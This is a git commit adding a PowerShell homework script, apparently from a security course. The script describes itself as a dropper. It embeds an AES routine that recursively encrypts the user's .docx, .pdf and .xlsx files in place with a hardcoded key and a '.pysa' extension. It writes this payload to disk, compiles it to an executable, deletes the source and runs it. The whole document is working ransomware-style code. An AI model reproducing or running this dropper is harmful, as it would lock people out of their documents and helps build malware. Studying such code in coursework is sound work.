c95828bc394beb39cd81772d18f1c6bae2503887
ChampPG <paul.gleason@mymail.champlain.edu>
2022-12-04 13:47:12 -0500

    Homework Done

---
+++ Week13/Homework/step1.ps1
@@ -0,0 +1,139 @@
+<#
+    Storyline: Dropper for your spambot that will save to a directory
+    and then execute it.
+#>
+
+$writeEncryption = @'
+function Invoke-AESEncryption {
+    [CmdletBinding()]
+    [OutputType([string])]
+    Param
+    (
+        [Parameter(Mandatory = $true)]
+        [ValidateSet('Encrypt', 'Decrypt')]
+        [String]$Mode,
+
+        [Parameter(Mandatory = $true)]
+        [String]$Key,
+
+        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
+        [String]$Text,
+
+        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
+        [String]$Path
+    )
+
+    Begin {
+        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
+        $aesManaged = New-Object System.Security.Cryptography.AesManaged
+        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+        $aesManaged.BlockSize = 128
+        $aesManaged.KeySize = 256
+    }
+
+    Process {
+        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
+
+        switch ($Mode) {
+            'Encrypt' {
+                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
+                
+                if ($Path) {
+                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
+                    if (!$File.FullName) {
+                        Write-Error -Message "File not found!"
+                        break
+                    }
+                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
+                    $outPath = $File.FullName + ".pysa"
+                }
+
+                $encryptor = $aesManaged.CreateEncryptor()
+                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
+                $encryptedBytes = $aesManaged.IV + $encryptedBytes
+                $aesManaged.Dispose()
+
+                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
+                
+                if ($Path) {
+                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
+                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
+                    return "File encrypted to $outPath"
+                }
+            }
+
+            'Decrypt' {
+                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
+                
+                if ($Path) {
+                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
+                    if (!$File.FullName) {
+                        Write-Error -Message "File not found!"
+                        break
+                    }
+                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
+                    $outPath = $File.FullName -replace ".aes"
+                }
+
+                $aesManaged.IV = $cipherBytes[0..15]
+                $decryptor = $aesManaged.CreateDecryptor()
+                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
+                $aesManaged.Dispose()
+
+                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
+                
+                if ($Path) {
+                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
+                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
+                    return "File decrypted to $outPath"
+                }
+            }
+        }
+    }
+
+    End {
+        $shaManaged.Dispose()
+        $aesManaged.Dispose()
+    }
+}
+
+# List the files in a directory and
+# Get-ChildItem -Recurse -Path .\Documents
+# Get-ChildItem -Recurse -Include *.pdf -Path .\Documents
+#                                   (*.file extension)
+
+# List all files and print the full path
+#Get-ChildItem -Recurse -Include *.docx,*.pdf,*.txt -Path .\Documents\ | Select FullName
+
+Get-ChildItem -Recurse -Include *.docx,*.pdf,*.xlsx -Path .\Documents\ | Export-Csv `
+-Path .\files.csv
+
+# Import the csv file.
+$fileList = Import-Csv .\files.csv -Header FullName
+
+
+# Loop through the results
+foreach ($f in $fileList) {
+
+    # Get-ChildItem -Path $f.FullName
+    Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path $f.FullName
+
+}
+
+'@
+
+# Directory to write the malicious code
+$sbDir = 'C:\Users\paul.gleason\Documents\SYS-320\SYS-320-01\Week13\Homework\'
+
+# Create the file and location to save the malicious code
+$file = $sbDir + "step2.ps1"
+
+# write to a file
+$writeEncryption | Out-File -FilePath $file
+
+# $newFile = $sbDir + "step2.exe"
+# Exectue the PowerShell script
+Invoke-ps2exe $file
+Remove-Item $file
+Invoke-Expression ".\step2.exe"
